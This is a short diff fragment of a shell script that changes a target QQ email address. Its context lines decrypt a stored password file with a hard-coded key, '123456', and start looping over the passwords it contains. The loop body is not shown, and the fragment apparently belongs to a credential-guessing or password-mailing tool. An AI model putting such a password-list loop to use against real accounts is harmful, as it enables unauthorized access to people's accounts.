@@ -13,7 +13,7 @@ done
 rm -rf .name-a
 HOSTNAME=$qqname
 HOSTEMAIL=$qqname@qq.com
-TARGET=1364036694@qq.com
+TARGET=13@qq.com
 openssl enc -des-ede3-cbc -in pass-a -out .pass-a -d -k 123456
 for pass in $(cat .pass-a)
 do
